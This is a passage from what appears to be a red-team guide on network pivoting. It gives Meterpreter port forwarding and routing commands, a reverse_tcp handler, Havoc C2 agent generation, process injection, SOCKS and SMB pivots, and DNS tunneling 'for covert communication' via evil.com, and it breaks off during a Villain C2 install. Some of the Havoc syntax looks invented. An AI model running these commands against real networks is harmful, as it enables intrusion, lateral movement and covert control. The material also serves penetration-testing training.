<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Local port forwarding through Meterpreter</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> portfwd </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-l</span><span class="token plain"> </span><span class="token number">3389</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-p</span><span class="token plain"> </span><span class="token number">3389</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-r</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.10.10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Local port forwarding with specific interface</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> portfwd </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-l</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-p</span><span class="token plain"> </span><span class="token number">80</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-r</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-L</span><span class="token plain"> </span><span class="token number">127.0</span><span class="token plain">.0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Reverse port forwarding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> portfwd </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-R</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-l</span><span class="token plain"> </span><span class="token number">8000</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-p</span><span class="token plain"> </span><span class="token number">80</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-L</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List active port forwards</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> portfwd list</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Delete specific port forward</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> portfwd delete </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-l</span><span class="token plain"> </span><span class="token number">3389</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-p</span><span class="token plain"> </span><span class="token number">3389</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-r</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.10.10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Flush all port forwards</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> portfwd flush</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="54-advanced-metasploit-pivoting-techniques">5.4 Advanced Metasploit Pivoting Techniques<a href="#54-advanced-metasploit-pivoting-techniques" class="hash-link" aria-label="Direct link to 5.4 Advanced Metasploit Pivoting Techniques" title="Direct link to 5.4 Advanced Metasploit Pivoting Techniques" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Multi-session routing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> route </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.10.0/24 </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> route </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token number">10.20</span><span class="token plain">.30.0/24 </span><span class="token number">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Session passing between handlers</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> sessions </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-k</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Background session for pivoting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter </span><span class="token operator">&gt;</span><span class="token plain"> background</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Session upgrading for better pivoting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> use post/multi/manage/shell_to_meterpreter</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf post</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">shell_to_meterpreter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> </span><span class="token environment constant" style="color:rgb(189, 147, 249)">SESSION</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf post</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">shell_to_meterpreter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Persistent route establishment</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf </span><span class="token operator">&gt;</span><span class="token plain"> use exploit/multi/handler</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf exploit</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> PAYLOAD windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf exploit</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> AutoRunScript post/multi/manage/autoroute</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="6-havoc-c2-modern-command-and-control-pivoting">6. Havoc C2: Modern Command and Control Pivoting<a href="#6-havoc-c2-modern-command-and-control-pivoting" class="hash-link" aria-label="Direct link to 6. Havoc C2: Modern Command and Control Pivoting" title="Direct link to 6. Havoc C2: Modern Command and Control Pivoting" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>Havoc C2 operations require a configured and running Havoc server. Ensure you generate appropriate agents and listeners for your specific architecture and scenario. Replace hostnames, ports, and agent parameters accordingly.</p></div></div>
<p>Havoc represents a state-of-the-art command and control framework with sophisticated pivoting capabilities designed for advanced persistent threat simulation.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="61-agent-deployment-and-configuration">6.1 Agent Deployment and Configuration<a href="#61-agent-deployment-and-configuration" class="hash-link" aria-label="Direct link to 6.1 Agent Deployment and Configuration" title="Direct link to 6.1 Agent Deployment and Configuration" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Generate pivot-capable agent</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">havoc --generate-agent </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--arch</span><span class="token plain"> x64 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--format</span><span class="token plain"> exe </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--sleep</span><span class="token plain"> </span><span class="token number">5</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--jitter</span><span class="token plain"> </span><span class="token number">10</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--pivot</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Deploy agent with custom configuration</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">havoc --agent-config </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">sleep</span><span class="token operator">=</span><span class="token number">10</span><span class="token plain">,jitter</span><span class="token operator">=</span><span class="token number">20</span><span class="token plain">,killdate</span><span class="token operator">=</span><span class="token number">2024</span><span class="token plain">-12-31</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Deploy via existing demon session</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> spawn </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--arch</span><span class="token plain"> x64 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--format</span><span class="token plain"> exe </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--listener</span><span class="token plain"> pivot_tcp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Agent with injection capabilities</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> inject </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--pid</span><span class="token plain"> </span><span class="token number">1234</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--arch</span><span class="token plain"> x64 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--format</span><span class="token plain"> shellcode</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="62-tcp-pivot-implementation">6.2 TCP Pivot Implementation<a href="#62-tcp-pivot-implementation" class="hash-link" aria-label="Direct link to 6.2 TCP Pivot Implementation" title="Direct link to 6.2 TCP Pivot Implementation" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Establish TCP pivot listener</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> pivot tcp </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lhost</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lport</span><span class="token plain"> </span><span class="token number">4444</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Connect new agent through pivot</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> pivot tcp </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--rhost</span><span class="token plain"> pivot_host </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--rport</span><span class="token plain"> </span><span class="token number">4444</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Bind TCP pivot on compromised host</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> pivot tcp </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--bind</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lport</span><span class="token plain"> </span><span class="token number">443</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--host</span><span class="token plain"> </span><span class="token number">0.0</span><span class="token plain">.0.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List active pivots</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> pivot list</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Remove specific pivot</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> pivot remove </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--id</span><span class="token plain"> </span><span class="token number">1</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="63-socks-proxy-configuration">6.3 SOCKS Proxy Configuration<a href="#63-socks-proxy-configuration" class="hash-link" aria-label="Direct link to 6.3 SOCKS Proxy Configuration" title="Direct link to 6.3 SOCKS Proxy Configuration" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Start SOCKS5 proxy through agent</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> socks start </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">1080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--host</span><span class="token plain"> </span><span class="token number">127.0</span><span class="token plain">.0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SOCKS proxy with authentication</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> socks start </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">1080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--user</span><span class="token plain"> admin </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--pass</span><span class="token plain"> secret</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Configure routing through SOCKS</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> route </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--network</span><span class="token plain"> </span><span class="token number">10.10</span><span class="token plain">.10.0/24 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--interface</span><span class="token plain"> socks </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">1080</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Stop SOCKS proxy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> socks stop </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">1080</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List SOCKS proxies</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> socks list</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="64-advanced-havoc-pivoting-features">6.4 Advanced Havoc Pivoting Features<a href="#64-advanced-havoc-pivoting-features" class="hash-link" aria-label="Direct link to 6.4 Advanced Havoc Pivoting Features" title="Direct link to 6.4 Advanced Havoc Pivoting Features" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Named pipe pivoting for same-host lateral movement</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> pivot smb --pipe-name </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;msf-pipe&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--host</span><span class="token plain"> target_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># HTTP(S) tunnel with custom user agent</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> pivot http </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--host</span><span class="token plain"> proxy_host </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> --user-agent </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Mozilla/5.0&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># DNS tunneling for covert communication</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> pivot dns </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--domain</span><span class="token plain"> evil.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--server</span><span class="token plain"> </span><span class="token number">8.8</span><span class="token plain">.8.8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Session passing between agents</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> session pass --session-id </span><span class="token number">2</span><span class="token plain"> --pivot-id </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Session cloning for redundancy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> session clone --session-id </span><span class="token number">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--method</span><span class="token plain"> tcp </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--host</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.200</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># P2P mesh networking</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">demon</span><span class="token operator">&gt;</span><span class="token plain"> pivot p2p </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--enable</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">6666</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--peers</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;192.168.1.100:6666&quot;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="7-villain-framework-collaborative-c2-with-session-sharing">7. Villain Framework: Collaborative C2 with Session Sharing<a href="#7-villain-framework-collaborative-c2-with-session-sharing" class="hash-link" aria-label="Direct link to 7. Villain Framework: Collaborative C2 with Session Sharing" title="Direct link to 7. Villain Framework: Collaborative C2 with Session Sharing" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>Villain requires Python 3 and is available in Kali Linux repositories. Replace IP addresses, usernames, passwords, and port numbers with values appropriate to your environment. The collaborative features require multiple Villain instances running on different machines.</p></div></div>
<p>Villain is a high-level stage 0/1 C2 framework that excels at managing multiple reverse TCP and HoaxShell-based shells while providing unique collaborative capabilities for team operations.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="71-framework-installation-and-setup">7.1 Framework Installation and Setup<a href="#71-framework-installation-and-setup" class="hash-link" aria-label="Direct link to 7.1 Framework Installation and Setup" title="Direct link to 7.1 Framework Installation and Setup" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Install from Kali repositories</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">apt</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">install</span><span class="token plain"> villain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Manual installation from source</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">git</span><span class="token plain"> clone https://github.com/t3l3machus/Villain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">cd</span><span class="token 